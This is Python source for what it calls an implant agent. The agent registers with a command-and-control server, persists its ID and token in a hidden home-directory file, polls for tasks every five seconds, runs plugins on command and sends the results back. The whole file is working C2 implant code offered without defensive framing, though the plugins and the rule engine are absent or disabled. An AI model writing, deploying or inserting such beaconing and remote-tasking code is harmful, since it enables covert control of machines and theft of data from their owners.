import requests
import time
import os
import json
import platform
import threading
import importlib
import pkgutil
import psutil
from typing import Dict, List, Type

from .plugins.base_plugin import BasePlugin

class CrawlerAgent:
    def __init__(self, c2_url="http://127.0.0.1:8000/api"):
        self.implant_id: str | None = None
        self.token: str | None = None
        self.running_plugins: Dict[str, BasePlugin] = {}
        self.loaded_plugins: Dict[str, BasePlugin] = {}
        self.rules: List[Dict] = []
        self.tasks_to_run: List[Dict] = []
        self.C2_URL = c2_url
        self.BEACON_INTERVAL_SECONDS = 5
        self.CONFIG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
        self.is_running = True

        self._load_rules()
        self._load_plugins()
        self._load_config()

    def _load_rules(self):
        try:
            rules_path = os.path.join(os.path.dirname(__file__), "rules.json")
            with open(rules_path, 'r') as f:
                self.rules = json.load(f)
            print(f"Loaded {len(self.rules)} rules.")
        except Exception:
            self.rules = []

    def _load_config(self):
        if os.path.exists(self.CONFIG_FILE_PATH):
            try:
                with open(self.CONFIG_FILE_PATH, 'r') as f:
                    config = json.load(f)
                    self.implant_id = config.get('implant_id')
                    self.token = config.get('token')
            except Exception: pass

    def _save_config(self):
        config = {'implant_id': self.implant_id, 'token': self.token}
        with open(self.CONFIG_FILE_PATH, 'w') as f:
            json.dump(config, f)
        if platform.system() != "Windows":
            os.chmod(self.CONFIG_FILE_PATH, 0o600)

    def _register_with_c2(self) -> bool:
        payload = {"hostname": platform.node(), "os": f"{platform.system()} {platform.release()}", "pid": os.getpid()}
        try:
            response = requests.post(f"{self.C2_URL}/register", json=payload, timeout=10)
            response.raise_for_status()
            data = response.json()
            self.implant_id = data['implant_id']
            self.token = data['token']
            self._save_config()
            return True
        except requests.exceptions.RequestException:
            return False

    def _load_plugins(self):
        self.loaded_plugins.clear()
        plugins_package = 'crawler.implant.plugins'
        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")

        for _, name, _ in pkgutil.iter_modules([plugins_path]):
            if name not in ["base_plugin"]:
                try:
                    module = importlib.import_module(f".{name}", package=plugins_package)
                    if hasattr(module, 'load'):
                        plugin_instance = module.load()
                        self.loaded_plugins[name] = plugin_instance
                        print(f"Loaded plugin: {name}")
                except Exception as e:
                    print(f"Failed to load plugin {name}: {e}")

    def _execute_rule_engine(self):
        pass # Rule engine disabled for this simplified agent

    def _check_network_trigger(self, port: int, status: str) -> bool:
        return False # Rule engine disabled

    def _handle_task(self, task: Dict):
        command = task.get('command')
        args = task.get('args', {})
        task_id = task.get('id')
        plugin_name = args.get('plugin_name')

        if command == "start_plugin" and plugin_name in self.loaded_plugins:
            try:
                plugin_instance = self.loaded_plugins[plugin_name]
                result = plugin_instance.run(args)

                if task_id and result is not None:
                    headers = {"Authorization": f"Bearer {self.token}"}
                    payload = {"task_id": task_id, "result": json.dumps(result)}
                    requests.post(f"{self.C2_URL}/tasks/result", json=payload, headers=headers, timeout=5)
            except Exception as e:
                print(f"Error running plugin {plugin_name} for task {task_id}: {e}")

        elif command == "terminate":
            self.is_running = False

    def run(self):
        if not self.implant_id or not self.token:
            if not self._register_with_c2():
                self.is_running = False
                return

        while self.is_running:
            try:
                headers = {"Authorization": f"Bearer {self.token}"}
                response = requests.get(f"{self.C2_URL}/tasks", headers=headers, timeout=5)

                if response.status_code == 401: # Token expired or invalid
                    if not self._register_with_c2():
                        time.sleep(self.BEACON_INTERVAL_SECONDS * 2)
                        continue

                response.raise_for_status()
                c2_tasks = response.json().get('tasks', [])

                for task in c2_tasks:
                    self._handle_task(task)

            except requests.exceptions.RequestException as e:
                print(f"C2 communication error: {e}")

            time.sleep(self.BEACON_INTERVAL_SECONDS)

if __name__ == "__main__":
    agent = CrawlerAgent()
    agent.run()
